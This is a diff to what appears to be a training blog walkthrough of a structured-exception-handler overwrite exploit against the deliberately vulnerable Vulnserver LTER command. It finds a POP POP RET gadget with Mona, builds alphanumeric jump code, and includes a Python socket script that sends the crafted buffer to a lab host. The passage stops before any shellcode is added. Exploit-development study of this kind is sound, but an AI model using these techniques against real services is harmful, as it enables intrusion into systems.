@@ -215,6 +215,7 @@ If you have no experience with SEH overwrite exploits, definitely check out the 
 
 Again, this exploit methodology is largely the same as Doyler's as I leaned on his walkthrough heavily, but I still wanted to share it to highlight the techniques it teaches. 
 
+### Overwriting SEH
 We will pick up at the SEH overwrite which is where we left off in the last post. We know we're restricted to alphanumeric shellcode. Let's overflow the SEH components and then find our offsets with Mona. 
 
 If we send our `A` value buffer we overwrite both 4 byte components of the SEH chain. 
@@ -272,8 +273,52 @@ And our stack looks great!
 
 ![](/assets/images/CTP/LTERgoodstack.JPG)
 
+Next we need to place a `POP POP RET` into our `C` buffer space. Let's let Mona do the dirty work with a `!mona seh -cp ascii` command. 
 
 ![](/assets/images/CTP/LTERseh.JPG)
+
+Let's use one of the `essfunc.dll` gadgets and grab the one at address `6250172B`.
+
+Next we need to place jump code into the 'next SEH record' space that will land us in our `D` value buffer. Let's use our trust 'Net Jump' technique since `EB` is restricted. We'll accomplish this by juxtaposing the opcodes \x74 (JZ) and \x75 (JNZ) and jump lengths of `0x06` and `0x04`. Since one of these is always true, we will end up in our `D` buffer. 
+
+So now our exploit looks like this:
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+nSeh = '\x74\x06\x75\x04'
+Seh = '\x2b\x17\x50\x62'
+
+buffer = 'A' * 3514
+buffer += nSeh
+buffer += Seh
+buffer += 'D' * (4000 - 3514 - 4 - 4)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+As you can see, this jumps us into our `D` buffer. **Don't forget to put a breakpoint at our `nSeh` jump code so you can step through from here going forward.**
+
+We: 
+1. land in our current SEH address which is a `POP POP RET`,
+2. we use `POP POP RET` to jump up into our 'next SEH' byte-space which holds jump code, 
+3. we jump into our `D` buffer. 
+
+![](/assets/images/CTP/LTERdbuff.JPG)
+
+
+
 
 
 -- TO BE CONTINUED... --
